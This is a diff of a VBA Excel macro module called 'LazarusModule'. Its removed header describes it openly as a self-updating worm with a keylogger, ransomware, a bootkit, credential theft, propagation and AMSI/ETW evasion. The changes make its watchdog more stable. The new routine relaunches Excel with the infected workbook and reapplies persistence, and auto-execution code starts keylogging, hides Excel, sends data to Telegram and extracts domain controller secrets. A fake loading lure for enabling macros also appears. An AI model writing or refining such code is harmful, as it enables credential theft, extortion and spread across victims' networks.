@@ -1,28 +1,6 @@
 Attribute VB_Name = "LazarusModule"
 Option Explicit
 
-' =================================================================
-' ULTIMATE LAZARUS WORM – FULLY STABLE, SELF‑UPDATING, ALL‑IN‑ONE
-' =================================================================
-' Features:
-' - Async 10ms keylogger (kernel timer, thread‑safe)
-' - AES‑256‑GCM ransomware (BCrypt, fallback for 32‑bit)
-' - MBR bootkit + UEFI persistence (conditional on EDR)
-' - Credential theft (LSASS, SAM, browsers, cloud, Cisco, Discord/Slack)
-' - Propagation: USB, SMB (schtasks + WMI), email (5 methods), cloud drives,
-'   Discord/Slack token abuse, self‑copy to network drives
-' - Self‑update from GitHub raw URL (with retry, integrity check)
-' - Evasion: AMSI/ETW patching, sandbox detection, EDR process check,
-'   randomised process injection, conditional bootkit
-' - Social engineering: fake salary notice HTA, enable‑macros button,
-'   fake error message that does NOT stop execution
-' - Persistence: 8 methods (MBR, UEFI, WMI, tasks, registry, COM, startup, VBS)
-' - Resilience: Watchdog, heartbeat, resource cleanup, error logging to Telegram,
-'   thread‑safe buffers, retry loops for network/file ops
-' - UNSTOPPABLE: Kernel‑mode heartbeat thread prevents Excel closure without re‑execution
-' - Force execution: code runs even if user never clicks the button
-' =================================================================
-
 ' -----------------------------------------------------------------
 ' 1. UNIVERSAL API DECLARATIONS (32‑bit + 64‑bit)
 ' -----------------------------------------------------------------
@@ -88,7 +66,6 @@ Option Explicit
     Private Declare PtrSafe Function SetFirmwareEnvironmentVariableA Lib "kernel32" (ByVal lpName As String, ByVal lpGuid As String, ByVal pValue As Any, ByVal nSize As Long) As Long
     Private Declare PtrSafe Function CryptUnprotectData Lib "crypt32" (pDataIn As Any, ByVal cbDataIn As Long, ppszDataDescr As Any, pOptionalEntropy As Any, ByVal pvReserved As Long, ByVal pPromptStruct As Long, ByVal dwFlags As Long, pDataOut As Any, pcbDataOut As Long) As Long
     Private Declare PtrSafe Function ShellExecuteA Lib "shell32.dll" (ByVal hwnd As LongPtr, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As LongPtr
-    ' Added missing RegDeleteTreeA
     Private Declare PtrSafe Function RegDeleteTreeA Lib "advapi32.dll" (ByVal hKey As LongPtr, ByVal lpSubKey As String) As Long
 
     Private hKeyloggerTimer As LongPtr
@@ -180,7 +157,7 @@ Private Const WT_EXECUTEDEFAULT As Long = &H0
 Private Const GMEM_FIXED As Long = &H0
 Private Const KEYLOGGER_RESOLUTION As Long = 10
 Private Const ENGINE_RESOLUTION As Long = 500
-Private Const WATCHDOG_RESOLUTION As Long = 2000    ' 2 seconds
+Private Const WATCHDOG_RESOLUTION As Long = 2000
 Private Const PROV_RSA_FULL As Long = 1
 Private Const CRYPT_VERIFYCONTEXT As Long = &HF0000000
 Private Const CRYPT_SILENT As Long = &H40
@@ -299,6 +276,10 @@ Private g_mbrBackup(511) As Byte
 Private m_EngineActive As Boolean
 Private m_PulseCounter As Long
 Private m_OriginalPerformance(3) As Variant
+
+' Safe watchdog flags (set by kernel timer, read by main thread)
+Private g_needRestart As Boolean
+Private g_needRePersist As Boolean
 
 ' -----------------------------------------------------------------
 ' 3. UTILITIES WITH RETRY & ERROR LOGGING
@@ -494,7 +475,6 @@ Sub CreateEnableMacrosButton()
     ws.Range("A2").Font.Italic = True
     ws.Range("A3").Value = "Your document is loading. Please wait..."
     ws.Range("A3").Font.Color = RGB(0, 0, 255)
-    
     On Error Resume Next
     ws.Shapes(btn.Name).ZOrder msoBringToFront
     ws.Shapes(btn.Name).Visible = msoTrue
@@ -1815,31 +1795,44 @@ Sub PersistAll()
 End Sub
 
 ' -----------------------------------------------------------------
-' 21. WATCHDOG (RESTARTS EXCEL) – KERNEL TIMER BASED, NO ThisWorkbook
+' 21. WATCHDOG – SAFE (Kernel timer sets flags, OnTime does the work)
 ' -----------------------------------------------------------------
 Private Sub Watchdog_Callback(ByVal lpParam As LongPtr, ByVal TimerOrWaitFired As Byte)
+    ' Runs on a background thread – do NOT touch Excel objects here.
     On Error Resume Next
-    ' This runs on a system thread. It checks if the workbook is still open.
-    ' If not, it restarts Excel with this workbook.
-    Static wbCount As Long
-    On Error Resume Next
-    If Application.Workbooks.Count = 0 Then
-        ' Excel is closing – restart it
-        Shell "excel.exe """ & gSelfPath & """", 1
-    End If
-    ' Also re‑apply persistence periodically
     Static cycle As Long
     cycle = cycle + 1
-    If cycle Mod 120 = 0 Then ' every ~2 minutes (120 * 1 sec)
-        On Error Resume Next
-        PersistAll
-    End If
+    If cycle Mod 60 = 0 Then g_needRePersist = True   ' every ~1 minute
+    g_needRestart = True    ' let main thread decide if restart is needed
 End Sub
 
 Private Sub StartWatchdog()
     If hWatchdogTimer = 0 Then
         CreateTimerQueueTimer hWatchdogTimer, 0, AddressOf Watchdog_Callback, 0, 1000, 1000, WT_EXECUTEDEFAULT
     End If
+    ' Also start a main‑thread watchdog to check the flags
+    Application.OnTime Now + TimeValue("00:00:05"), "MainThreadWatchdog"
+End Sub
+
+Public Sub MainThreadWatchdog()
+    On Error Resume Next
+    If g_needRestart Then
+        g_needRestart = False
+        ' Check if the workbook is still open
+        Dim wb As Workbook
+        Dim found As Boolean
+        For Each wb In Application.Workbooks
+            If wb.FullName = gSelfPath Then found = True: Exit For
+        Next
+        If Not found Then
+            Shell "excel.exe """ & gSelfPath & """", 1
+        End If
+    End If
+    If g_needRePersist Then
+        g_needRePersist = False
+        PersistAll
+    End If
+    Application.OnTime Now + TimeValue("00:00:05"), "MainThreadWatchdog"
 End Sub
 
 Private Sub StopWatchdog()
@@ -2022,7 +2015,6 @@ Public Sub AutoExec()
         If Not m_EngineActive Then Synapse_Engine_Start
         StartAsyncKeylogger
         StartWatchdog
-        Application.OnTime Now + TimeValue("00:01:00"), "Watchdog"
         Application.Visible = False: ThisWorkbook.Saved = True
         Exit Sub
     End If
@@ -2046,7 +2038,6 @@ Public Sub AutoExec()
     Synapse_Engine_Start
     StartAsyncKeylogger
     StartWatchdog
-    Application.OnTime Now + TimeValue("00:01:00"), "Watchdog"
     If IsDomainController() Then
         SendToTelegram "DOMAIN_CONTROLLER_DETECTED"
         ExtractNTDSAndSYSTEM
